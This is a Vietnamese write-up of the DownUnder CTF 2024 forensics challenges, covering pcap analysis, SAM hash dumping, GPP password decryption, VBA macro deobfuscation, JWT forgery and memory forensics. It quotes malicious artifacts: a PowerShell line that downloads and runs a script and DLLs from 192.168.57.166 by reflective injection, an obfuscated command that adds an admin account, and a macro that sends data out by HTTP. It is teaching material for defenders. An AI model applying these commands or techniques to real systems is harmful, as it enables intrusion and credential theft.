# DownUnder CTF 2024
### I. Baby's First Forensics.
```
Question: They’ve been trying to breach our infrastructure all morning! They’re trying to get more info on our covert kangaroos! We need your help, we’ve captured some traffic of them attacking us, can you tell us what tool they were using and its version?
```
- Chall này cho ta 1 file `.pcap` và yêu cầu là cần tìm tên và version của tool mà attacker xài để tấn công , khá dễ khi xem file pcap thì chỉ toàn các protocol liên quan đến `HTTP` follow bất kì protocol nào cũng cung cấp cho ta tên và version của tool mà ta cần.
![1720889135245](image/writeup/1720889135245.png)
![1720889122095](image/writeup/1720889122095.png)

*`FLAG: DUCTF{Nikto_2.1.6}`*
### II. SAM I AM.
```
Question: The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files. Can you reproduce how they got the Administrator’s Password with the artifacts provided?
```
- Chall này cho ta 2 file `REGISTRY HIVES` là `SAM` và `SYSTEM` quá hoàn hoản cho việc lấy được tên User và password của user đó , và flag sẽ là password của của admin.
- Ta có thể dễ dàng lấy được user và pass bằng rất nhiều các công cụ như `impacket-secretsdump` , `samdump2` , `mimikatz` .....
- Có được hash của pass thì ta lên [web](https://crackstation.net) để crack là oke.
```
$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xa88f47504785ba029e8fa532c4c9e27b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:476b4dddbbffde29e739b618580adb1e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```
![1720889608330](image/writeup/1720889608330.png)

*`FLAG: DUCTF{!checkerboard1}`*

### III. Bad Policies.
```
Question: Looks like the attacker managed to access the rebels Domain Controller. Can you figure out how they got access after pulling these artifacts from one of our Outpost machines?
```
- Chall này cho ta 1 folder như thế này :
```
$ tree rebels.ductf/
rebels.ductf/
├── DfsrPrivate
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── MACHINE
│   │   │   ├── Applications
│   │   │   ├── comment.cmtx
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Registry.pol
│   │   │   └── Scripts
│   │   │       ├── Shutdown
│   │   │       └── Startup
│   │   └── USER
│   ├── {3EF191ED-9090-44C9-B436-C2766F6F0156}
│   │   ├── GPT.INI
│   │   ├── Machine
│   │   │   ├── comment.cmtx
│   │   │   └── Registry.pol
│   │   └── User
│   ├── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│   │   ├── GPT.INI
│   │   ├── MACHINE
│   │   │   └── Microsoft
│   │   │       └── Windows NT
│   │   │           └── SecEdit
│   │   │               └── GptTmpl.inf
│   │   └── USER
│   ├── {B6EF39A3-E84F-4C1D-A032-00F042BE99B5}
│   │   ├── GPT.INI
│   │   ├── Machine
│   │   │   └── Preferences
│   │   │       └── Groups
│   │   │           └── Groups.xml
│   │   └── User
│   └── {EFF21FC3-F476-4AE0-9DDC-07BE32C98CE4}
│       ├── GPT.INI
│       ├── Machine
│       │   ├── Microsoft
│       │   │   └── Windows NT
│       │   │       └── SecEdit
│       │   │           └── GptTmpl.inf
│       │   └── Scripts
│       │       ├── Shutdown
│       │       └── Startup
│       └── User
│           ├── Documents & Settings
│           └── Scripts
│               ├── Logoff
│               └── Logon
└── scripts
```
- Các file khác dường như không có quá nhiều thông tin tuy nhiên file này `{B6EF39A3-E84F-4C1D-A032-00F042BE99B5}/Machine/Preferences/Groups/Groups.xml` lại có đôi chút khác biệt và khá sú.
```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Backup" image="2" changed="2024-06-12 14:26:50" uid="{CE475804-94EA-4C12-8B2E-2B3FFF1A05C4}"><Properties action="U" newName="" fullName="" description="" cpassword="B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="Backup"/></User>
</Groups>
```
- Khi nhìn ta có thể thấy 1 đoạn mã khá giống mã base nằm ở phần `cpassword` , khi thử decode và tìm hiểu thì nó đã bị mã hóa bằng `AES` sử dụng 32 bit key được [public online](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN).
- Ta sử dụng [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) hoặc là [tool này](https://github.com/t0thkr1s/gpp-decrypt) là có thể decrypt ra được thui.
```
$ gpp-decrypt "B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2"
DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}
```

```
$ python3 gpp-decrypt.py -c B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2

                               __                                __
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/
/___/  /_/    /_/                                /___/  /_/

[ * ] Password: DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}
```
*`FLAG: DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}`*
### IV. Macros Magic.
- Chall này cho ta 1 file `.pcap` và 1 file excel, ta cùng phân tích file pcap trước vậy.
- Khi ngồi mò thì lúc check HTTP protocol thì có thấy 1 dãy khá giống hex nhưng mà decode ra thì chả có gì cả file pcap này cũng chỉ tới đó thui cho nên là ta tiếp tục tới file excel.
![1720897175334](image/writeup/1720897175334.png)
- Mấy cái file excel hay docx gì đấy thì cứ `olevba` , xài tool thì ta được đoạn VBA script như sau (sau khi đã loại bỏ các đoạn văn bản vô nghĩa):
```
Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function

Public Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function

Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function


Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long
    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing (J)
    J = "http://flag.com/"
    superThing (J)
    G = "key"
    J = "http://play.duc.tf/"
    superThing (J)
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing (J)
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing (J)
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing (J)
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)

End Sub

Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function

Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function

Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function

Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```
- Nhìn thì có vẻ dài dòng nhưng nó lại khá dễ hiểu :
    + anotherThing() - Hàm này về cơ bản chỉ thực hiện XOR trên hai chuỗi.
    + importantThing() - Hàm này tạo ra các số ngẫu nhiên và sắp xếp chúng.
    + TotalyFine() - Hàm này sửa đổi một chuỗi bằng cách thay thế dấu cách bằng dấu gạch nối.
    + superThing() - Hàm này gửi yêu cầu GET và trả về phản hồi.
    + something() - Hàm này chuyển đổi từng ký tự của chuỗi thành biểu diễn nhị phân của nó.
    + forensics() - Hàm này chuyển đổi một chuỗi thành biểu diễn byte bằng dấu cách.
- Có thể hiểu đơn giản là cái VBA script này tiến hành xor cách chuỗi thành các byte sau đó là gửi nó đi với `GET` ở dạng là 1 URL , y hệt những gì ta thấy ở trong file pcap.
- Đây là dạng rút gọn và dễ hiểu hơn của code trên :
```
def doThing(b: str, c: str) -> str:
    a = ""
    for i in range(len(b)):
        a += chr(ord(b[i]) ^ ord(c[i % len(c)]))
    return a


def forensics(b: str) -> str:
    a = b.encode("utf-8")
    c = " ".join(str(byte) for byte in a)
    return c


def totalyFine(b: str):
    return b.replace(" ", "-")


def something(b: str) -> str:
    a = ""
    for char in b:
        a += format(ord(char), "08b")
    return a


def anotherThing(b: str, c: str) -> str:
    a = ""
    for i in range(len(b)):
        a += chr(ord(b[i]) ^ ord(c[i % len(c)]))
    return a


K = "Yes"
S = "Mon"
U = forensics(K)
V = totalyFine(U)
D = "Ma"
J = "https://play.duc.tf/" + V
print(J)

G = "key"
F = "gic"
# N = importantThing()
Q = "Flag: No"
H = "Try Harder"

U = forensics(H)
V = totalyFine(U)
J = "http://downunderctf.com/" + V
print(J)

W = S + G + D + F
O = doThing(Q, W)
M = anotherThing(O, W)
A = something(O)
Z = forensics(O)
P = "Pterodactyl"
U = forensics(P)
V = totalyFine(U)
J = "http://play.duc.tf/" + V
print(J)

T = totalyFine(Z)
J = "http://downunderctf.com/" + T
print(J)
```
- Khi đọc code này thì ta có thể thấy 1 Biến `W` nó được 1 số biến khác sử dụng để làm Key để xor và Key là `MonkeyMagic`. Vậy là Đủ thông tin rồi , chuỗi hex ban đầu ta kiếm được có vẻ là flag đã decrypt và gửi đi dưới dạng 1 URL ta chỉ cần lấy chuỗi hex đó xor với key là ra flag.
```
def decode(encoded, key):
    decoded = ""
    key_len = len(key)
    for i in range(len(encoded)):
        decoded += chr(encoded[i] ^ ord(key[(i) % key_len]))
    return decoded

flag = [11, 3, 15, 12, 95, 89, 9, 52, 36, 61, 37, 54, 34, 90, 15, 86, 38, 26, 80, 19, 1, 60, 12, 38, 49, 9, 28, 38, 0, 81, 9, 2, 80, 52, 28, 19]
key = "MonkeyMagic"

decoded_message = decode(flag, key)
print(decoded_message)
```

*`FLAG: DUCTF{M4d3_W1th_AI_by_M0nk3ys}`*
### V. Emuc2
- Chall này cho ta 1 file pcap và 1 file `sslkeylogfile.txt`, khi check file pcap thì bên trong nó có TLS protocol , khá đơn giản ta sẽ xài file SSL kia để decrypt các TLS đó.
- KHi check TLS thì thấy có đăng nhập 1 web tên là `forensics-emuc2-b6abd8652aa4.2024.ductf.dev` link này có hoạt động.
![1720986026849](image/writeup/1720986026849.png)
![1720985840344](image/writeup/1720985840344.png)
- Nó yêu cầu đăng nhập , mình vào check `HTTP2` thì thấy có user và pass tuy nhiên đăng nhập vào thì ta lại được thông báo là không có quyền để xem flag và đồng thời ở phía dưới có `JWT Token` được tạo ra, để có flag thì cách duy nhất ta có thể làm là tìm `JWT token` đúng để có quyền có flag. 
![1720986343894](image/writeup/1720986343894.png)
- Ở `Stream 23` có hiển thị Path URL (đường dẫn của URL) là `/api/env` là nơi lưu trữ của các tệp được tải lên và ta thấy rất nhiều file đã được tải lên.   
![1720986297729](image/writeup/1720986297729.png)
- Bằng cách mò từng file một thì ở file `T4yLN35GKLhxTgaykWxdgROCAwIBE3FO` có 1 `JWT_SECRET Token` được lưu ở trong đó.
![1720986424398](image/writeup/1720986424398.png)
- Tuy nhiên ta cần phải decode nó ra thì mới xài được
```
import jwt

data = {"subject_id": 1, "exp": 1920187883}
JWT_SECRET = "3gHsCBkpZLi99zyiPqfY/NfFJqZzmNL4BAhYN8rAjRn49baTcnmyGISLD6T58XcWIUYrBfltI2iq2N6OHQSrfqBRFxFta61PvmnfRyn8Ep8T55lvLT8Es62kN3x35Bcb0OZmOGmM/zKf2qadcBq3Nbq1MiIVKJMz4w3JOk4orwFPtSNpNh8uaSQQUNMKTT6cvD9bvRvFNeeHYSPhDFwayPIRr5TJ+BpIRTUTfc1C3WCKoOuXCz2t+ISZo5yYwZ6U5w7NKFTTuDqMP/dXevkVykuntdej55XE3fsCP+UVFUT2JrY+Z9Q1aKTgavQR5smYVn93RlpbFwCoSStoANnoi"

encoded = jwt.encode(data, JWT_SECRET, algorithm="HS512")
print(encoded)
```
```
└─$ python3 script.py 
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWJqZWN0X2lkIjoxLCJleHAiOjE5MjAxODc4ODN9.6_Al8k0dDcd86Mza6fuhaTfu08RHZQ4QtDspXJCpnYYI_9cWWGIGUMnXD7zqQBTQaV1F8WxAYZhx5KG16yCVhA
```
- Thay thế Token ở trên với Token đã đăng nhập ở web vừa rồi thì ta đã có thể leo quyền và truy cập được flag.
![1720986690317](image/writeup/1720986690317.png)

*`FLAG: DUCTF{pǝʇɔǝɟuᴉ_sᴉ_ǝlᴉɟ_dᴉz_ǝɥʇ_oʇ_pɹoʍssɐd_ǝɥʇ}`*

### VI. lost in Memory
```
Question: Looks like one of our Emu soldiers ran something on an Outpost machine and now it’s doing strange things. We took a memory dump as a precaution. Can you tell us whats going on?

1. What was the name of the malicious executable? eg malicious.xlsm

2. What was the name of the powershell module used? eg invoke-mimikatz 

3. What were the names of the two files executed from the malicious executable (In alphabetical order with - in between and no spaces)? eg malware.exe-malware2.exe

4. What was the password of the new account created through powershell? eg strong-password123
```
- Chall này cho ta 1 file mem và ta cần phải trả lời 4 câu hỏi trên ghép nó lại là có flag.
##### Q1: What was the name of the malicious executable? eg malicious.xlsm
- Khi check pslist thì thấy có rất nhiều tiến trình khác nhau nên là mình check thử xem cmdline có file nào đó đáng ngờ không thì tiềm thấy 2 file đó là `monkey.doc.ps1` và `Monke.xlsm`.
```
4044    notepad.exe     "C:\Windows\system32\NOTEPAD.EXE" C:\Users\emu\Desktop\Monke\Monke.xlsm
2052    svchost.exe     C:\Windows\System32\svchost.exe -k WerSvcGroup
372     iexplore.exe    "C:\Program Files\Internet Explorer\iexplore.exe" SCODEF:3620 CREDAT:857350 /prefetch:2
1136    powershell.exe  "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe"
2560    conhost.exe     \??\C:\Windows\system32\conhost.exe "158028775362525928-990426691-456752985-958521227-13089283931015300999189980646
1248    WmiApSrv.exe    C:\Windows\system32\wbem\WmiApSrv.exe
3048    notepad.exe     "C:\Windows\System32\notepad.exe" "C:\Users\emu\Downloads\monkey.doc.ps1"
```
- Tiến hành dump nó về thì ta chỉ có thể dump được file `monkey.doc.ps1` có thể đây chính là tiến trình đáng ngờ.
- Mình thấy có process `powershell` nên có qua vol2 check lệnh consoles thì thấy có thêm 1 vài lệnh nữa và nó củng cố thêm `monkey.doc.ps1` chính là đáp án cho câu hỏi này.
```
$ ./vol2 -f "/mnt/d/FORENSICS/challenge/DownUnderCTF/Lost in Memory/EMU-OUTPOST/EMU-OUTPOST.raw" --profile=Win7SP1x86_23418 consoles

Cmd #0 at 0x2e2c38: cd C:\Users\emu\Downloads
Cmd #1 at 0x2e2358: .\monkey.doc.ps1
Cmd #2 at 0x304588: r
----
Screen 0x2e68f0 X:120 Y:3000
Dump:
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Users\emu\Downloads
PS C:\Users\emu\Downloads> .\monkey.doc.ps1

Security Warning
Run only scripts that you trust. While scripts from the Internet can be useful, this script can potentially harm your
computer. Do you want to run C:\Users\emu\Downloads\monkey.doc.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): r

Id              Name            State      HasMoreData     Location             Command
--              ----            -----      -----------     --------             -------
1               Job1            Running    True            localhost            iex (New-Object net.we...
3               Job3            Running    True            localhost            iex (New-Object net.we...


PS C:\Users\emu\Downloads>
```

##### Q2: What was the name of the powershell module used? eg invoke-mimikatz && Q3: What were the names of the two files executed from the malicious executable (In alphabetical order with - in between and no spaces)? eg malware.exe-malware2.exe
- Khi tải file `monkey.doc.ps1` thì ta được code sau :
```
Start-Job -ScriptBlock {iex (New-Object net.webclient).Downloadstring('http://192.168.57.166/reflective/reflect.ps1'); Invoke-ReflectivePEInjection -PEUrl http://192.168.57.166/documents/emu.dll};Start-Job -ScriptBlock {iex (New-Object net.webclient).Downloadstring('http://192.168.57.166/reflective/reflect.ps1'); Invoke-ReflectivePEInjection -PEUrl http://192.168.57.166/documents/kiwi.dll}
```
- Ta có thể nhận ra được là file đó nó sẽ tải 2 file `emu.dll` và `Kiwi.dll` và thực thi 2 file đó bằng powershell module `Invoke-ReflectivePEInjection`. Toàn bộ cách trên có thể cho thấy cách tấn công này có thể là [reflective DLL injection](https://www.hackthebox.com/blog/reflection-ca-ctf-2022-forensics-writeup).

##### Q4: What was the password of the new account created through powershell? eg strong-password123.
- Khi check bằng cmdline thì ta có thể thấy 2 file `monkey.doc.ps1` và `Monke.xlsm` đều được mở bằng `notepad` mà file `monkey.doc.ps1` ta đã tải về được rồi vậy chi còn file còn lại ta có thể dump cả tiến trình có thể sẽ kiếm được 1 cái gì đó.
- Quả thật là kiếm được 1 cái gì đó khi filter `powershell` ta lại được 1 script khác nữa.
```
└─$ strings pid.4044.dmp | grep "powershell"          
powershell.exe
powershell/
powershell.exe
powershell.exe
powershell.exe
powershell/
ly loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
ly loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
powershell $PKjAU=  ") )'dd'+'a/ n'+'i'+'mda'+' sro'+'t'+'artsinimda'+' p'+'uorglacol'+' te'+'n;d'+'d'+'a/ 3r'+'uce5-r3'+'pu'+'5'+' nimda resu '+'te'+'n'(( )'x'+]31[dIlLehs$+]1[diLLehs$ (."; .( $Env:CoMsPeC[4,24,25]-JOIn'')(-join (  gi  vaRiaBlE:pKjAU).valUe[-1 .. - ( (  gi  vaRiaBlE:pKjAU).valUe.leNgth) ] )
Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

```
- Bằng cách loại bỏ ký tự `'+'` và đảo 20 ký tự đầu sẽ ta sẽ được 1 script khác nữa như sau.
![1720990202585](image/writeup/1720990202585.png)
- Vậy mật khẩu mới của user là `5up3r-5ecur3`.

*`FLAG: DUCTF{monkey.doc.ps1_invoke-reflectivepeinjection_emu.dll-kiwi.dll_5up3r-5ecur3}`*